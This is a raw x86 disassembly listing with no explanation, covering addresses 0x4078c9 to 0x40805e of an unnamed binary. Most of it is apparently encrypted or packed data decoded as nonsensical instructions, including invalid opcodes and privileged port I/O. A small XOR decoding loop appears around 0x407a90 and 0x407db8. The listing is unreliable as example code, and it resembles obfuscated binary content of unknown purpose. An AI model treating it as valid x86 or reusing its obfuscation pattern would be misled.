  4078c9:	rcr    BYTE PTR [edi+0xa2cb297],1
  4078cf:	rcl    DWORD PTR [ebp+edx*8-0x7a3fbf14],0xcc
  4078d7:	in     eax,0x85
  4078d9:	icebp  
  4078da:	push   0xffffffa2
  4078dc:	cmove  esp,edx
  4078df:	cld    
  4078e0:	pop    edi
  4078e1:	je     0x407920
  4078e3:	xor    bl,cl
  4078e5:	sub    al,0x67
  4078e7:	inc    esp
  4078e8:	repz pop ds
  4078ea:	(bad)  [edx+0x5b3de965]
  4078f0:	test   BYTE PTR [edx-0x48],ch
  4078f3:	jnp    0x4078ea
  4078f5:	or     eax,0xb8d7375c
  4078fa:	pushf  
  4078fb:	mov    dh,BYTE PTR [edi+ecx*4+0x44]
  4078ff:	push   esp
  407900:	retf   0x285a
  407903:	loope  0x4078c2
  407905:	mov    ecx,?
  407907:	mov    al,ds:0x23e4ddf
  40790c:	pusha  
  40790d:	push   eax
  40790e:	sub    DWORD PTR [ebp-0x40],eax
  407911:	sbb    al,0x75
  407913:	pop    edi
  407914:	fadd   QWORD PTR [eax]
  407916:	mov    BYTE PTR [esi-0x62],ch
  407919:	xor    al,0x45
  40791b:	fld    DWORD PTR [esi+ebx*4]
  40791e:	cwde   
  40791f:	or     BYTE PTR [esi-0x7e637cb5],ah
  407925:	dec    edi
  407926:	jbe    0x407931
  407928:	fstp   TBYTE PTR [ebp+0x799eea6f]
  40792e:	push   edx
  40792f:	push   es
  407930:	or     ebp,DWORD PTR [ecx+0x38]
  407933:	into   
  407934:	and    al,0x84
  407936:	pop    ds
  407937:	scas   al,BYTE PTR es:[edi]
  407938:	in     eax,0x24
  40793a:	dec    esp
  40793b:	inc    edi
  40793c:	cld    
  40793d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40793e:	lea    esi,[ebx+0x36]
  407941:	fstp   st(5)
  407943:	xor    edi,DWORD PTR [edi-0x8be3bda]
  407949:	push   es
  40794a:	aas    
  40794b:	push   ecx
  40794c:	pop    esp
  40794d:	and    al,0x16
  40794f:	sbb    al,0xef
  407951:	sti    
  407952:	add    dh,BYTE PTR [edx+0x5f01d63f]
  407958:	rol    BYTE PTR [esi+0x10],1
  40795b:	adc    ecx,DWORD PTR [ecx-0x3323eed9]
  407961:	inc    ebp
  407962:	fs arpl si,sp
  407965:	test   DWORD PTR [ecx-0x4ec2d368],eax
  40796b:	cmp    cl,bh
  40796d:	and    al,0xe2
  40796f:	push   0xff9329d
  407974:	xlat   BYTE PTR ds:[ebx]
  407975:	and    al,0x3
  407977:	sub    eax,0xe67fe9c9
  40797c:	jl     0x40799f
  40797e:	and    BYTE PTR [esi],bl
  407980:	jno    0x407933
  407982:	cmp    esi,DWORD PTR [edx]
  407984:	push   ecx
  407985:	or     al,0x26
  407987:	cmp    BYTE PTR [ebx+0x76b1e258],cl
  40798d:	js     0x4079c1
  40798f:	je     0x407971
  407991:	mov    ds:0xca817978,eax
  407996:	inc    edi
  407997:	fisubr DWORD PTR [ebx]
  407999:	jmp    FWORD PTR [ebx]
  40799b:	fiadd  DWORD PTR [ebx-0x4ad20a5f]
  4079a1:	in     al,0x8d
  4079a3:	push   ecx
  4079a4:	(bad)  
  4079a5:	out    dx,al
  4079a6:	add    DWORD PTR [eax],0x674ad0b
  4079ac:	cmc    
  4079ad:	add    BYTE PTR [esi],dl
  4079af:	push   esp
  4079b0:	adc    eax,0x36454a2b
  4079b5:	mov    ah,0x39
  4079b7:	push   0xffffffe0
  4079b9:	push   edx
  4079ba:	ds mov ah,0x6c
  4079bd:	adc    BYTE PTR [ebp-0x799c9368],0x60
  4079c4:	pop    esp
  4079c5:	and    al,0xd7
  4079c7:	call   0x61e1044a
  4079cc:	lahf   
  4079cd:	xchg   ebp,eax
  4079ce:	popa   
  4079cf:	dec    ebx
  4079d0:	cmp    dh,dl
  4079d2:	mov    edx,0x9bd3b770
  4079d7:	pop    DWORD PTR [ebp+0x7ff4efa4]
  4079dd:	mov    cl,0xd0
  4079df:	loopne 0x407a2d
  4079e1:	adc    al,0x90
  4079e3:	push   ss
  4079e4:	retf   
  4079e5:	mov    BYTE PTR [ecx+0x10],dl
  4079e8:	xchg   edx,eax
  4079e9:	adc    al,0xc1
  4079eb:	test   BYTE PTR [eax+0x2a3df486],bl
  4079f1:	xchg   DWORD PTR [esi],ebp
  4079f3:	arpl   WORD PTR [eax+ebp*1-0x36],dx
  4079f7:	push   eax
  4079f8:	inc    esi
  4079f9:	jmp    0xf5679bd8
  4079fe:	and    DWORD PTR [ecx-0x1ca0b192],ecx
  407a04:	jmp    0x98e10b62
  407a09:	pop    ebp
  407a0a:	stos   DWORD PTR es:[edi],eax
  407a0b:	push   ebx
  407a0c:	cld    
  407a0d:	cwde   
  407a0e:	in     eax,dx
  407a0f:	pop    ds
  407a10:	cmc    
  407a11:	in     al,dx
  407a12:	in     eax,dx
  407a13:	mov    esi,DWORD PTR [esi-0x53970cb4]
  407a19:	outs   dx,BYTE PTR ds:[esi]
  407a1a:	or     ebp,DWORD PTR [esi+0x759cd662]
  407a20:	jmp    0x4079e0
  407a22:	jnp    0x4079ba
  407a24:	fist   WORD PTR [ebp+0x20]
  407a27:	jne    0x407a76
  407a29:	rcl    BYTE PTR [ebx-0x55],1
  407a2c:	bound  edi,QWORD PTR [ebx-0x5d51d003]
  407a32:	mov    eax,ds:0x1aebfe80
  407a37:	fnstsw WORD PTR [edx+0x19]
  407a3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a3b:	xor    eax,0x98abed36
  407a40:	inc    esi
  407a41:	xchg   dl,dh
  407a43:	ficomp WORD PTR [ebx-0x21]
  407a46:	mov    ds:0x6f216904,eax
  407a4b:	mov    bh,0xbe
  407a4d:	xchg   BYTE PTR ds:0x1dcd5e77,ah
  407a53:	fucomp st(3)
  407a55:	mov    dh,0xa1
  407a57:	mov    dl,BYTE PTR [edx+0x78]
  407a5a:	iret   
  407a5b:	and    edx,edi
  407a5d:	mov    ebp,0x53494944
  407a62:	es loop 0x407ae4
  407a65:	or     DWORD PTR [eax-0x27],ebp
  407a68:	mov    edx,0x29eab0ad
  407a6d:	sbb    bh,ch
  407a6f:	in     al,0xac
  407a71:	push   sp
  407a73:	retf   
  407a74:	sub    bh,BYTE PTR [eax]
  407a76:	bound  esp,QWORD PTR [eax]
  407a78:	dec    ecx
  407a79:	(bad)  
  407a7a:	in     eax,0xa8
  407a7c:	and    DWORD PTR [ecx],edi
  407a7e:	sbb    cl,ah
  407a80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a81:	and    edx,DWORD PTR [ebp+0x174cb067]
  407a87:	push   ecx
  407a88:	cmp    BYTE PTR [ecx-0x37],ch
  407a8b:	mov    esi,0xc70366a5
  407a90:	movzx  eax,ax
  407a93:	mov    DWORD PTR [ebp-0x14],eax
  407a96:	mov    eax,DWORD PTR [ebp+0x8]
  407a99:	movzx  eax,WORD PTR [eax+edx*4]
  407a9d:	xor    eax,0x8a36
  407aa2:	add    eax,edi
  407aa4:	mov    edi,DWORD PTR [ebp-0x14]
  407aa7:	mov    BYTE PTR [ebp+edi*1-0x58],al
  407aab:	mov    eax,DWORD PTR [ebp-0xc]
  407aae:	inc    edx
  407aaf:	jmp    0x407db8
  407ab4:	ror    ebp,0xd6
  407ab7:	retf   
  407ab8:	fcmove st,st(3)
  407aba:	rcl    ebp,1
  407abc:	adc    edx,DWORD PTR [esi+0x3c]
  407abf:	xchg   esp,eax
  407ac0:	js     0x407abb
  407ac2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ac3:	xchg   ebx,eax
  407ac4:	pushf  
  407ac5:	fstp   TBYTE PTR [eax+0x78]
  407ac8:	fs jle 0x407b43
  407acb:	js     0x407ac0
  407acd:	mov    esi,0xb2543f71
  407ad2:	iret   
  407ad3:	mov    dh,0xd9
  407ad5:	pop    ebx
  407ad6:	push   ss
  407ad7:	add    BYTE PTR [edi],bl
  407ad9:	repz xchg esi,eax
  407adb:	inc    edi
  407adc:	mov    ah,0x28
  407ade:	lods   eax,DWORD PTR ds:[esi]
  407adf:	dec    ebp
  407ae0:	pop    ss
  407ae1:	mov    bl,0x91
  407ae3:	enter  0xc087,0x24
  407ae7:	inc    ebp
  407ae8:	sub    esi,DWORD PTR [ebx-0x54]
  407aeb:	in     eax,0x64
  407aed:	pushf  
  407aee:	test   eax,0xac088534
  407af3:	xchg   esi,eax
  407af4:	pop    edx
  407af5:	jmp    0xe7d2aef7
  407afa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407afb:	out    0x23,eax
  407afd:	into   
  407afe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407aff:	add    eax,eax
  407b01:	rcl    DWORD PTR [edx-0x1e87efdd],1
  407b07:	pop    es
  407b08:	scas   eax,DWORD PTR es:[edi]
  407b09:	mov    dl,0x98
  407b0b:	mov    ah,bh
  407b0d:	sbb    esi,DWORD PTR [edi]
  407b0f:	sti    
  407b10:	pop    edx
  407b11:	sub    eax,0xa75fb53d
  407b16:	mov    edi,0x3bc780f2
  407b1b:	and    edx,DWORD PTR [ebx+esi*2-0x5]
  407b1f:	sbb    al,0xda
  407b21:	sbb    BYTE PTR [edx-0x2d],ah
  407b24:	push   esp
  407b25:	sbb    eax,0xd14086e8
  407b2a:	shl    DWORD PTR [edx+eiz*2-0x477a1fe3],0x46
  407b32:	retf   
  407b33:	xchg   edx,eax
  407b34:	dec    ecx
  407b35:	inc    esi
  407b36:	jb     0x407b34
  407b38:	fdivr  QWORD PTR [edx+0x12c317ac]
  407b3e:	iret   
  407b3f:	jns    0x407ba4
  407b41:	xor    eax,DWORD PTR [ecx]
  407b43:	or     eax,0xb323aedd
  407b48:	icebp  
  407b49:	push   eax
  407b4a:	jmp    0xe6dc:0x8fd17e86
  407b51:	mov    al,ds:0x3459b9e2
  407b56:	repnz or ch,BYTE PTR [ecx+0x31]
  407b5a:	inc    ebp
  407b5b:	jns    0x407b09
  407b5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407b5e:	mov    ds:0x8c17db47,al
  407b63:	stos   BYTE PTR es:[edi],al
  407b64:	popf   
  407b65:	xor    eax,DWORD PTR [ebx-0x59dd8a2a]
  407b6b:	lds    eax,FWORD PTR [edx]
  407b6d:	pop    ds
  407b6e:	je     0x407bc8
  407b70:	push   0xfccb3fa9
  407b75:	mov    eax,0x27342838
  407b7a:	sub    BYTE PTR [eax],bl
  407b7c:	cwde   
  407b7d:	cld    
  407b7e:	cdq    
  407b7f:	mov    WORD PTR [eax],fs
  407b81:	jmp    0x407b61
  407b83:	cli    
  407b84:	iret   
  407b85:	pop    es
  407b86:	adc    DWORD PTR [esi+0x6632f022],edx
  407b8c:	add    bl,al
  407b8e:	dec    ebp
  407b8f:	jbe    0x407b54
  407b91:	add    al,BYTE PTR [eax+0x2662322b]
  407b97:	dec    edi
  407b98:	out    0x7d,al
  407b9a:	in     eax,dx
  407b9b:	mov    edi,0xdf1beaea
  407ba0:	loopne 0x407bdf
  407ba2:	add    eax,0x623736e
  407ba7:	outs   dx,DWORD PTR ds:[esi]
  407ba8:	xchg   edi,eax
  407ba9:	rcr    DWORD PTR [esp+edi*1+0x7a],1
  407bad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407bae:	popf   
  407baf:	dec    ebp
  407bb0:	sub    al,0x6d
  407bb2:	jp     0x407b4c
  407bb4:	pop    ebp
  407bb5:	in     eax,0x33
  407bb7:	mov    dl,0x59
  407bb9:	(bad)  
  407bbb:	(bad)  
  407bbc:	mov    eax,0xe35b2a50
  407bc1:	cmp    eax,0x23eccf34
  407bc6:	dec    esi
  407bc7:	pop    ss
  407bc8:	stc    
  407bc9:	or     BYTE PTR [ebp+0x5b67262b],bl
  407bcf:	sbb    DWORD PTR [ebx-0x5bd7ebf3],edi
  407bd5:	popf   
  407bd6:	in     al,0x62
  407bd8:	adc    eax,0x8d7102b6
  407bdd:	jmp    FWORD PTR [eax+0x319f3c5f]
  407be3:	inc    eax
  407be4:	(bad)  
  407be5:	sbb    al,dh
  407be7:	loop   0x407baf
  407be9:	int    0xc5
  407beb:	outs   dx,DWORD PTR ds:[esi]
  407bec:	jne    0x407c0e
  407bee:	retf   
  407bef:	in     eax,0xef
  407bf1:	loope  0x407bca
  407bf3:	fnstcw WORD PTR [ebx]
  407bf5:	mov    fs,WORD PTR [edx]
  407bf7:	cmp    BYTE PTR [eax],bl
  407bf9:	leave  
  407bfa:	fadd   st(5),st
  407bfc:	loope  0x407c0e
  407bfe:	lds    ebp,FWORD PTR [edi-0x750838fa]
  407c04:	jnp    0x407c84
  407c06:	adc    DWORD PTR [esi],ebp
  407c08:	popa   
  407c09:	mov    ebx,0x3a67d3ab
  407c0e:	pop    esp
  407c0f:	and    al,0x92
  407c11:	imul   DWORD PTR [ebp-0x4f]
  407c14:	sahf   
  407c15:	fwait
  407c16:	pusha  
  407c17:	xor    DWORD PTR [edi+ebx*8-0x2a884c5a],ebp
  407c1e:	ins    BYTE PTR es:[edi],dx
  407c1f:	adc    DWORD PTR [eax-0x20af2810],0xffffff82
  407c26:	jge    0x407c95
  407c28:	outs   dx,DWORD PTR ds:[esi]
  407c29:	lock loop 0x407c7d
  407c2c:	jmp    0x1b7e:0xcbad66d3
  407c33:	pop    ebx
  407c34:	xchg   ebp,eax
  407c35:	lods   al,BYTE PTR ds:[esi]
  407c36:	das    
  407c37:	fistp  DWORD PTR [ecx+0x4409e398]
  407c3d:	sub    bl,BYTE PTR [eax+0x5f]
  407c40:	in     eax,0xbd
  407c42:	pop    sp
  407c44:	jnp    0x407c67
  407c46:	fisttp DWORD PTR [edi]
  407c48:	mov    al,ds:0x23bc8960
  407c4d:	xor    BYTE PTR [eax-0x7a493023],0x3f
  407c54:	mov    ch,0xd0
  407c56:	cmc    
  407c57:	test   DWORD PTR [edx-0x11],ecx
  407c5a:	cli    
  407c5b:	je     0x407c6b
  407c5d:	push   es
  407c5e:	ds dec ebx
  407c60:	cmp    al,0x89
  407c62:	jo     0x407cb0
  407c64:	cmp    al,al
  407c66:	retf   0x562b
  407c69:	leave  
  407c6a:	jb     0x407c58
  407c6c:	test   al,0x33
  407c6e:	mov    ch,cl
  407c70:	mov    DWORD PTR [edx],edi
  407c72:	nop
  407c73:	loope  0x407cca
  407c75:	loopne 0x407caf
  407c77:	pop    ebx
  407c78:	out    0x6b,eax
  407c7a:	cmp    ch,BYTE PTR [ecx+0x1f]
  407c7d:	call   0xf182:0xc08e6674
  407c84:	push   cs
  407c85:	call   0xe280aa34
  407c8a:	mov    edi,0x1b08c5ee
  407c8f:	or     esi,ebx
  407c91:	test   al,0x60
  407c93:	fsubr  DWORD PTR [edi]
  407c95:	sbb    al,0x99
  407c97:	loope  0x407c78
  407c99:	xor    eax,0x419b7b30
  407c9e:	ins    BYTE PTR es:[edi],dx
  407c9f:	add    bh,BYTE PTR [edx-0x12]
  407ca2:	or     eax,ebx
  407ca4:	ds pop ss
  407ca6:	adc    eax,0x223da2a4
  407cab:	add    al,BYTE PTR [ecx+edx*2]
  407cae:	lods   al,BYTE PTR ds:[esi]
  407caf:	add    BYTE PTR [edi],ah
  407cb1:	pop    ebp
  407cb2:	in     eax,0x70
  407cb4:	sub    ebx,DWORD PTR [edx+edi*8+0x13ea4f2b]
  407cbb:	(bad)  
  407cbc:	jp     0x407cd9
  407cbe:	(bad)  
  407cc0:	sbb    BYTE PTR [edx],ch
  407cc2:	mov    ch,ah
  407cc4:	sub    ah,ch
  407cc6:	in     al,0x6
  407cc8:	les    edx,FWORD PTR [ecx-0x2a]
  407ccb:	imul   eax,ebx,0xd
  407cce:	leave  
  407ccf:	or     dl,ch
  407cd1:	xor    DWORD PTR [ecx],ebp
  407cd3:	enter  0xed5a,0x7e
  407cd7:	jnp    0x407cd1
  407cd9:	dec    esi
  407cda:	xlat   BYTE PTR ds:[ebx]
  407cdb:	(bad)  
  407cdc:	or     BYTE PTR [edx],ch
  407cde:	push   0x56e0e1d1
  407ce3:	pusha  
  407ce4:	push   ds
  407ce5:	mov    al,BYTE PTR [edx-0x1762ce1d]
  407ceb:	jge    0x407d60
  407ced:	sbb    DWORD PTR [eax+0x56],esp
  407cf0:	dec    edi
  407cf1:	push   edx
  407cf2:	cwde   
  407cf3:	aaa    
  407cf4:	sub    DWORD PTR [ebx],edi
  407cf6:	pop    esp
  407cf7:	and    BYTE PTR [ebp+0x4d],dl
  407cfa:	popf   
  407cfb:	cs pop ss
  407cfd:	dec    edx
  407cfe:	mov    bl,0x94
  407d00:	xor    esp,DWORD PTR [ebx-0x7c85e32e]
  407d06:	pop    ss
  407d07:	pop    DWORD PTR [eax-0x4]
  407d0a:	dec    eax
  407d0b:	popf   
  407d0c:	or     al,0x8f
  407d0e:	ret    
  407d0f:	mov    ebx,0x780c2b8
  407d14:	loope  0x407cec
  407d16:	mov    dh,0xca
  407d18:	mov    ebx,0x68762d49
  407d1d:	push   edx
  407d1e:	sbb    dl,BYTE PTR [eax]
  407d20:	cli    
  407d21:	push   eax
  407d22:	ret    
  407d23:	xor    al,ch
  407d25:	and    BYTE PTR [ecx+0x7217c4],cl
  407d2b:	jp     0x407d9f
  407d2d:	pushf  
  407d2e:	popf   
  407d2f:	ror    bl,1
  407d31:	cdq    
  407d32:	psubusb mm7,QWORD PTR [ecx]
  407d35:	mov    cl,0xd6
  407d37:	pushf  
  407d38:	mov    ecx,0xb7c1ab79
  407d3d:	push   edx
  407d3e:	dec    esi
  407d3f:	cs scas eax,DWORD PTR es:[edi]
  407d41:	mov    bl,0x9f
  407d43:	push   esi
  407d44:	iret   
  407d45:	je     0x407d4f
  407d47:	popf   
  407d48:	and    bl,BYTE PTR [ecx+ebx*8]
  407d4b:	das    
  407d4c:	sub    BYTE PTR [eax-0x57],bh
  407d4f:	das    
  407d50:	aad    0x11
  407d52:	nop
  407d53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d54:	xor    eax,0x499a5547
  407d59:	xor    bl,BYTE PTR [eax]
  407d5b:	jmp    0x95bf:0x1b8f5a64
  407d62:	and    al,0x96
  407d64:	(bad)  
  407d65:	mov    ds:0xdfa61c0b,eax
  407d6a:	push   es
  407d6b:	in     al,dx
  407d6c:	sbb    al,0xb1
  407d6e:	pop    ds
  407d6f:	icebp  
  407d70:	in     al,dx
  407d71:	push   ebp
  407d72:	pop    ebx
  407d73:	cwde   
  407d74:	jno    0x407de6
  407d76:	xor    al,0xe5
  407d78:	dec    BYTE PTR [edx-0x7f]
  407d7b:	(bad)  
  407d7c:	jge    0x407d3b
  407d7e:	lahf   
  407d7f:	aaa    
  407d80:	jecxz  0x407d0d
  407d82:	sub    ebp,DWORD PTR [edx-0x6a]
  407d85:	sbb    DWORD PTR [eax+0x13],ebp
  407d88:	push   0x55
  407d8a:	addr16 std 
  407d8c:	std    
  407d8d:	or     bl,BYTE PTR [ebx-0x71807831]
  407d93:	popf   
  407d94:	mov    ebp,0x648b143d
  407d99:	lock adc DWORD PTR [ebx-0x54],edi
  407d9d:	int3   
  407d9e:	dec    ebx
  407d9f:	add    eax,0x257360a9
  407da4:	xor    cl,BYTE PTR [esi]
  407da6:	inc    edx
  407da7:	enter  0x2c36,0x4a
  407dab:	int    0x4
  407dad:	stc    
  407dae:	mov    al,ds:0xa17ce38d
  407db3:	cli    
  407db4:	add    bl,BYTE PTR [eax]
  407db6:	int    0x9
  407db8:	cmp    edx,eax
  407dba:	jne    0x407772
  407dc0:	pop    edi
  407dc1:	pop    ebx
  407dc2:	mov    eax,DWORD PTR [ebp-0x8]
  407dc5:	mov    edx,DWORD PTR [ebp+0x10]
  407dc8:	jmp    0x4080d1
  407dcd:	retf   0xd73f
  407dd0:	ret    0xdad9
  407dd3:	fld    st(7)
  407dd5:	add    BYTE PTR [eax+0x7c],bl
  407dd8:	fdiv   st,st(1)
  407dda:	push   edx
  407ddb:	into   
  407ddc:	jg     0x407d66
  407dde:	fdivr  DWORD PTR [eax+0x78]
  407de1:	fs jle 0x407e5c
  407de4:	js     0x407d8e
  407de6:	lea    ebx,[edi+edi*4+0x49]
  407dea:	dec    esi
  407deb:	ja     0x407e0d
  407ded:	jb     0x407e66
  407def:	mov    ecx,0xf4598ac2
  407df4:	test   al,0xe0
  407df6:	jmp    0x407e5e
  407df8:	xor    eax,0x456487eb
  407dfd:	pop    eax
  407dfe:	xor    eax,0x93392e22
  407e03:	push   0x56e48d19
  407e08:	fldcw  WORD PTR [ebx+0x3c]
  407e0b:	jns    0x407e22
  407e0d:	pop    edi
  407e0e:	push   0x3d
  407e10:	pop    ss
  407e11:	xor    ch,BYTE PTR ds:0xa1e2d552
  407e17:	pop    DWORD PTR [edx]
  407e19:	dec    esp
  407e1a:	push   es
  407e1b:	mov    al,0x28
  407e1d:	cmp    dl,BYTE PTR ds:0x6e75213
  407e23:	sub    al,0xfa
  407e25:	mov    ah,0x74
  407e27:	mov    ah,BYTE PTR [edi-0x1013c3e6]
  407e2d:	cmp    al,0x59
  407e2f:	xlat   BYTE PTR cs:[ebx]
  407e31:	out    dx,al
  407e32:	or     esi,esp
  407e34:	jmp    0xa206:0x7912f8d2
  407e3b:	mov    ?,WORD PTR [esi]
  407e3d:	out    dx,al
  407e3e:	fsubr  QWORD PTR [esi+0xa]
  407e41:	cli    
  407e42:	aam    0xa6
  407e44:	push   esi
  407e45:	into   
  407e46:	dec    esp
  407e47:	xor    eax,edx
  407e49:	enter  0xd797,0xc4
  407e4d:	and    ecx,0xffffffd5
  407e50:	sbb    esp,ecx
  407e52:	xchg   ebx,eax
  407e53:	sub    al,0x6f
  407e55:	adc    eax,0x2c314a9
  407e5a:	fld    st(4)
  407e5c:	adc    cl,bl
  407e5e:	enter  0xb6fa,0x73
  407e62:	cmp    eax,0xb61c092d
  407e67:	out    0x55,eax
  407e69:	cmp    esp,DWORD PTR [ecx]
  407e6b:	or     DWORD PTR [ebx+ebp*8-0x5ac2c268],esp
  407e72:	ss inc eax
  407e74:	pop    ds
  407e75:	ins    DWORD PTR es:[edi],dx
  407e76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407e77:	adc    DWORD PTR [edi+0x11541117],edi
  407e7d:	ds int3 
  407e7f:	pop    ds
  407e80:	sub    eax,0xb76c8517
  407e85:	dec    eax
  407e86:	shl    BYTE PTR [ecx],1
  407e88:	cmp    al,0xb7
  407e8a:	out    dx,eax
  407e8b:	mov    ch,0xe8
  407e8d:	adc    eax,0x5c72ee2a
  407e92:	mov    ebx,0xb1907c47
  407e97:	aad    0x43
  407e99:	mov    ?,WORD PTR [edx]
  407e9b:	mov    dh,0xf5
  407e9d:	mov    DWORD PTR [ecx+0x13],esp
  407ea0:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  407ea2:	mov    BYTE PTR [edx-0x582645e4],cl
  407ea8:	jl     0x407e66
  407eaa:	mov    edx,0xd31bb12b
  407eaf:	pusha  
  407eb0:	out    dx,eax
  407eb1:	push   esp
  407eb2:	push   ecx
  407eb3:	jmp    0x90b7:0xfd84bb94
  407eba:	pop    esi
  407ebb:	xchg   ebx,eax
  407ebc:	mov    DWORD PTR [eax-0x16],edi
  407ebf:	inc    ebp
  407ec0:	sub    esp,DWORD PTR [ebx+0x63edf093]
  407ec6:	sar    edx,0xe2
  407ec9:	inc    ebx
  407eca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ecb:	jge    0x407f45
  407ecd:	sbb    ch,cl
  407ecf:	pusha  
  407ed0:	dec    esp
  407ed1:	jns    0x407f11
  407ed3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ed4:	push   esp
  407ed5:	xchg   edi,eax
  407ed6:	les    esp,FWORD PTR [edx+0x6706858]
  407edc:	nop
  407edd:	fidiv  DWORD PTR [esi]
  407edf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ee0:	pushf  
  407ee1:	push   0x913c0681
  407ee6:	mov    esp,0xff114245
  407eeb:	jne    0x407ece
  407eed:	push   ecx
  407eee:	retf   0x6a96
  407ef1:	and    ecx,DWORD PTR [ebx+0x42]
  407ef4:	and    esp,ebp
  407ef6:	add    eax,0xed2ecde0
  407efb:	push   cs
  407efc:	cld    
  407efd:	and    ah,BYTE PTR [ebx]
  407eff:	xchg   ebp,eax
  407f00:	push   0x6c8a0220
  407f05:	rol    DWORD PTR [ecx],0xd3
  407f08:	jl     0x407f25
  407f0a:	push   ds
  407f0b:	inc    ecx
  407f0c:	sti    
  407f0d:	push   ss
  407f0e:	add    eax,0x921cc3
  407f13:	mov    ebx,0x2e7bcd55
  407f18:	push   ss
  407f19:	aad    0x84
  407f1b:	cmp    al,0x75
  407f1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407f1e:	js     0x407f05
  407f20:	fcomp  QWORD PTR [edi+ebx*4]
  407f23:	and    esi,esp
  407f25:	lea    esi,[ebp+0xc]
  407f28:	inc    eax
  407f29:	in     al,dx
  407f2a:	pop    ecx
  407f2b:	into   
  407f2c:	push   ebp
  407f2d:	dec    DWORD PTR [esi+0x1d]
  407f30:	xor    al,0xf6
  407f32:	jl     0x407efd
  407f34:	push   eax
  407f35:	xchg   ecx,eax
  407f36:	mov    WORD PTR [ecx],cs
  407f38:	fwait
  407f39:	jg     0x407f52
  407f3b:	dec    edi
  407f3c:	enter  0x7e05,0x81
  407f40:	imul   ecx,DWORD PTR [edx],0xd4e4fa93
  407f46:	inc    eax
  407f47:	sub    cl,BYTE PTR [edx+esi*4-0x43e1b920]
  407f4e:	add    DWORD PTR [eax],ebx
  407f50:	and    BYTE PTR [ebx],cl
  407f52:	cmc    
  407f53:	ret    0x5c31
  407f56:	pop    edi
  407f57:	xor    al,0xb2
  407f59:	iret   
  407f5a:	fsub   DWORD PTR [ebp+0x46913490]
  407f60:	mov    ah,0xef
  407f62:	jb     0x407f69
  407f64:	dec    esp
  407f65:	mov    esi,0x4f6e776f
  407f6a:	adc    ebp,0x41f7b837
  407f70:	or     DWORD PTR ds:0xd6fd22cf,edx
  407f76:	fld1   
  407f78:	scas   eax,DWORD PTR es:[edi]
  407f79:	mov    eax,ds:0x917d27d7
  407f7e:	clc    
  407f7f:	dec    esi
  407f80:	push   edi
  407f81:	inc    eax
  407f82:	stos   BYTE PTR es:[edi],al
  407f83:	icebp  
  407f84:	fisttp DWORD PTR [esi]
  407f86:	push   cs
  407f87:	je     0x407ff4
  407f89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407f8a:	cmp    eax,edi
  407f8c:	ja     0x407f94
  407f8e:	cmp    BYTE PTR [ecx],ah
  407f90:	sahf   
  407f91:	imul   ebx,DWORD PTR [eax+0x6669aeda],0x3722298a
  407f9b:	xor    DWORD PTR [ebp-0x6b72429f],ecx
  407fa1:	push   0xffffff8d
  407fa3:	jno    0x407f4f
  407fa5:	sbb    BYTE PTR [ecx-0x6b81b64c],0xc5
  407fac:	and    ecx,ecx
  407fae:	out    0xc0,eax
  407fb0:	and    cl,BYTE PTR [esi-0x6ee63c24]
  407fb6:	shr    DWORD PTR [ecx-0x38],0x12
  407fba:	sub    bl,al
  407fbc:	mov    ds:0x4cc199c8,al
  407fc1:	jmp    0x52215807
  407fc6:	xor    DWORD PTR [edi+eiz*1],ecx
  407fc9:	int3   
  407fca:	icebp  
  407fcb:	bound  edi,QWORD PTR [edx-0x6f]
  407fce:	inc    edi
  407fcf:	in     al,0x1b
  407fd1:	inc    ebx
  407fd2:	aam    0xa3
  407fd4:	dec    ebp
  407fd5:	adc    eax,0xa6eddd7c
  407fda:	data16 fadd st(5),st
  407fdd:	out    dx,al
  407fde:	popa   
  407fdf:	ins    BYTE PTR es:[edi],dx
  407fe0:	mov    ebp,0x2d449aa0
  407fe5:	sbb    BYTE PTR [eax+0x23],bh
  407fe8:	push   ebp
  407fe9:	(bad)  
  407fea:	sti    
  407feb:	xchg   ebx,eax
  407fec:	imul   edi,DWORD PTR [edx],0x18
  407fef:	retf   
  407ff0:	and    ebp,DWORD PTR [ecx+0x19]
  407ff3:	mov    cl,0x16
  407ff5:	in     al,0x15
  407ff7:	stos   DWORD PTR es:[edi],eax
  407ff8:	pop    edx
  407ff9:	mov    ah,0xa8
  407ffb:	add    dh,cl
  407ffd:	test   ch,ch
  407fff:	pop    esi
  408000:	div    DWORD PTR [ebx+0x7d]
  408003:	mov    ch,0xbf
  408005:	sbb    BYTE PTR [edi-0x121426cd],bl
  40800b:	jl     0x407fae
  40800d:	cdq    
  40800e:	(bad)  
  40800f:	fnstenv [edx+0x3820f321]
  408015:	mov    ebx,0x36a759a4
  40801a:	shl    DWORD PTR [edx],1
  40801c:	clc    
  40801d:	pop    esp
  40801e:	jl     0x40801d
  408020:	in     al,0x37
  408022:	push   eax
  408023:	sub    cl,BYTE PTR [ecx-0x6f306705]
  408029:	fcmove st,st(1)
  40802b:	les    esi,FWORD PTR [esi+0x672be75f]
  408031:	js     0x408075
  408033:	jmp    0x734d:0x36f9f349
  40803a:	pop    ss
  40803b:	jb     0x407fe8
  40803d:	lea    esi,[eax+0x41]
  408040:	js     0x4080b4
  408042:	lods   al,BYTE PTR ds:[esi]
  408043:	dec    eax
  408044:	in     eax,0xe6
  408046:	(bad)  
  408048:	not    DWORD PTR [esp+esi*2+0x5c]
  40804c:	mul    ecx
  40804e:	mov    edi,0xd5a2bf9a
  408053:	jl     0x408028
  408055:	or     ah,BYTE PTR [ebx]
  408057:	xor    dl,BYTE PTR [esi-0x69]
  40805a:	xlat   BYTE PTR ds:[ebx]
  40805b:	sar    BYTE PTR [edi],0x18
  40805e:	add    eax,0xe4a3bf4f
